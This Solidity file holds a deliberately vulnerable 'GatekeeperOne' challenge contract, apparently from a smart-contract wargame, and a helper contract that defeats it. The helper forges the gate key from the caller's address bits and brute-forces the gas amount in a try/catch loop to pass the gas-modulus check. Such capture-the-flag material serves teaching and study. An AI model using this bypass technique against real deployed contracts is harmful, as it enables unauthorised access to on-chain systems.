// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneHelper {
    function enter(address _gk) public {
        bytes8 gateKey = bytes8(uint64(42)) << 32;
        bytes8 origin = bytes8(uint64(uint16(uint160(tx.origin))));
        gateKey |= origin;

        require(uint32(uint64(gateKey)) == uint16(uint64(gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(gateKey)) != uint64(gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

        for (uint256 gasValue = 1200000; gasValue > 1190000; --gasValue) {
            try GatekeeperOne(_gk).enter{gas: gasValue}(gateKey) {
                break;
            } catch {

            }
        }
    }
}
